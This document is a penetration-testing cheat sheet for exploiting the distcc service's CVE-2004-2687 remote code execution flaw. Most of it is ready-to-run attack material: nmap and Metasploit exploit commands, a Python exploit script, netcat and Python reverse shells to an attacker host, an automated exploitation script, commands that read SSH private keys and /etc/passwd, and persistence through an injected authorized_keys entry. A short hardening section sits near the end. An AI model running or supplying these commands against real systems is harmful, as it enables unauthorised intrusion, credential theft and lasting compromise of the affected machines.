# DISTCC ENUMERATION (Port 3632/TCP)

## SERVICE OVERVIEW
```
distcc (Distributed C/C++ Compiler) - Distributed compilation service
- Default port: 3632/TCP
- Used to distribute compilation tasks across multiple machines
- Common on Linux development environments
- CVE-2004-2687: Remote code execution vulnerability
- Often misconfigured with no authentication
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p3632 <IP>                            # Service/Version detection
nc -nv <IP> 3632                                # Manual connection
telnet <IP> 3632                                # Alternative connection
```

## NMAP ENUMERATION
```bash
# Comprehensive distcc scan
nmap -p3632 --script distcc-cve2004-2687 <IP>   # Check for CVE-2004-2687
nmap -sV -p3632 <IP>                            # Version detection

# Combined scan
nmap -sV -p3632 --script distcc-* <IP> -oA distcc_scan
```

## REMOTE CODE EXECUTION (CVE-2004-2687)
```bash
# distcc daemon allows arbitrary command execution
# Vulnerability: No authentication required

# Nmap script exploitation
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" <IP>

# Execute commands
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='whoami'" <IP>
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='uname -a'" <IP>
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='cat /etc/passwd'" <IP>
```

## METASPLOIT EXPLOITATION
```bash
msfconsole
use exploit/unix/misc/distcc_exec               # distcc RCE exploit
set RHOSTS <IP>
set RPORT 3632
set LHOST <your_IP>
set LPORT 4444

# Set payload
set PAYLOAD cmd/unix/reverse                    # Reverse shell
set PAYLOAD cmd/unix/bind_netcat                # Bind shell
set PAYLOAD cmd/unix/generic                    # Generic command

# Exploit
exploit
```

## MANUAL EXPLOITATION
```bash
# distcc protocol format:
# DIST00000001<command>

# Send command via netcat
printf "DIST00000001\x00\x00\x00\x01\x00\x00\x00id\x00" | nc -nv <IP> 3632

# Python exploit script
cat > distcc_exploit.py <<'EOF'
#!/usr/bin/env python3
import socket
import sys

def exploit(host, port, command):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # distcc protocol: DIST<version><command>
    payload = b"DIST00000001" + command.encode() + b"\x00"
    s.send(payload)

    response = s.recv(4096)
    print(response.decode())
    s.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <command>")
        sys.exit(1)

    exploit(sys.argv[1], 3632, sys.argv[2])
EOF

chmod +x distcc_exploit.py
python3 distcc_exploit.py <IP> "id"
```

## REVERSE SHELL
```bash
# Using Metasploit reverse shell
msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS <IP>; set LHOST <attacker_IP>; set PAYLOAD cmd/unix/reverse_netcat; exploit"

# Manual reverse shell via nmap script
nmap -p3632 --script distcc-cve2004-2687 \
  --script-args="distcc-cve2004-2687.cmd='nc <attacker_IP> 4444 -e /bin/bash'" <IP>

# Reverse shell with python
nmap -p3632 --script distcc-cve2004-2687 \
  --script-args="distcc-cve2004-2687.cmd='python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"<attacker_IP>\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\"'" <IP>

# Listener
nc -nvlp 4444
```

## ENUMERATION COMMANDS
```bash
# System information
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='uname -a'" <IP>

# User information
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='whoami'" <IP>
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" <IP>

# Network information
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='ifconfig'" <IP>
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='ip a'" <IP>

# Read files
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='cat /etc/passwd'" <IP>
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='cat /home/*/.ssh/id_rsa'" <IP>

# Find SUID binaries
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='find / -perm -4000 2>/dev/null'" <IP>
```

## POST-EXPLOITATION
```bash
# After getting shell via distcc:

# Check privileges
whoami
id
sudo -l

# Enumerate system
uname -a
cat /etc/*-release
cat /etc/passwd

# Find interesting files
find / -name "*.conf" 2>/dev/null
find / -name "*.bak" 2>/dev/null
find /home -name "id_rsa" 2>/dev/null

# Privilege escalation enumeration
find / -perm -4000 2>/dev/null              # SUID binaries
cat /etc/crontab                            # Cron jobs
ss -tulpn                                   # Network connections
```

## PRIVILEGE ESCALATION
```bash
# distcc typically runs as 'distccd' user
# Check for privilege escalation vectors:

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable /etc/passwd (rare but possible)
ls -la /etc/passwd

# Sudo permissions
sudo -l

# Kernel exploits (if outdated kernel)
uname -a
searchsploit linux kernel <version>

# Check for writable paths in PATH
echo $PATH
```

## AUTOMATED EXPLOITATION SCRIPT
```bash
cat > distcc_pwn.sh <<'EOF'
#!/bin/bash
TARGET=$1
LHOST=$2
LPORT=4444

if [ -z "$TARGET" ] || [ -z "$LHOST" ]; then
    echo "Usage: $0 <target_IP> <attacker_IP>"
    exit 1
fi

echo "[*] Exploiting distcc on $TARGET"
echo "[*] Setting up listener on $LHOST:$LPORT"

# Start listener in background
nc -nvlp $LPORT &
LISTENER_PID=$!

sleep 2

# Send reverse shell payload
echo "[*] Sending reverse shell payload"
msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS $TARGET; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD cmd/unix/reverse_netcat; exploit; exit"

wait $LISTENER_PID
EOF

chmod +x distcc_pwn.sh
./distcc_pwn.sh <target_IP> <attacker_IP>
```

## COMMON MISCONFIGURATIONS
```
☐ distcc running with no authentication
☐ distcc accessible from external networks
☐ Running outdated vulnerable version (CVE-2004-2687)
☐ No firewall rules restricting access
☐ distccd running as privileged user (rare but dangerous)
☐ No logging/monitoring of distcc usage
☐ Exposed to internet (port forwarding, DMZ)
```

## QUICK WIN CHECKLIST
```
☐ Check if distcc is accessible (port 3632 open)
☐ Test for CVE-2004-2687 (nmap script)
☐ Execute 'id' command to confirm RCE
☐ Get reverse shell via Metasploit or manual exploit
☐ Enumerate system (OS, users, network)
☐ Check for privilege escalation vectors (SUID, sudo)
☐ Search for SSH keys, credentials, sensitive files
☐ Escalate privileges if possible
☐ Establish persistence (backdoor user, SSH key)
```

## ONE-LINER EXPLOITATION
```bash
# Quick RCE test
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" <IP>

# One-liner reverse shell (Metasploit)
msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS <IP>; set LHOST <attacker_IP>; set PAYLOAD cmd/unix/reverse_netcat; exploit; exit"
```

## VULNERABILITY DETAILS
```
CVE-2004-2687: distcc Arbitrary Command Execution

Description:
- distcc versions before 2.x and 3.x allow remote attackers
  to execute arbitrary commands via shell metacharacters
- No authentication required by default
- Commands executed with privileges of distccd user

Affected versions:
- distcc < 2.18.3
- distcc 3.x (some configurations)

CVSS Score: 9.3 (Critical)

Exploit availability:
- Metasploit: exploit/unix/misc/distcc_exec
- Nmap script: distcc-cve2004-2687
- Public exploits available on ExploitDB
```

## TOOLS
```bash
# Nmap
nmap -p3632 --script distcc-cve2004-2687 <IP>

# Metasploit
use exploit/unix/misc/distcc_exec

# Netcat
nc -nv <IP> 3632

# searchsploit
searchsploit distcc
```

## SECURITY IMPLICATIONS
```
RISKS:
- Remote code execution (RCE) without authentication
- Complete system compromise possible
- Lateral movement to other systems
- Data exfiltration
- Persistence/backdoor installation
- Privilege escalation potential

RECOMMENDATIONS:
- Disable distcc if not actively needed
- Restrict access to trusted networks only (firewall)
- Update to latest patched version
- Use distcc with authentication (if supported)
- Run distccd with minimal privileges
- Monitor distcc logs for suspicious activity
- Implement network segmentation
- Use VPN/SSH tunneling for remote access
```

## EXPLOITATION WALKTHROUGH
```bash
# 1. Scan for distcc
nmap -sV -p3632 <IP>

# 2. Test for vulnerability
nmap -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" <IP>

# 3. Get reverse shell
# Terminal 1: Listener
nc -nvlp 4444

# Terminal 2: Exploit
msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS <IP>; set LHOST <attacker_IP>; set PAYLOAD cmd/unix/reverse_netcat; exploit"

# 4. Post-exploitation
whoami
id
uname -a
find / -perm -4000 2>/dev/null
sudo -l

# 5. Privilege escalation (if needed)
# Check for SUID binaries, kernel exploits, etc.

# 6. Persistence
echo "ssh-rsa AAAA...attacker@kali" >> ~/.ssh/authorized_keys
```
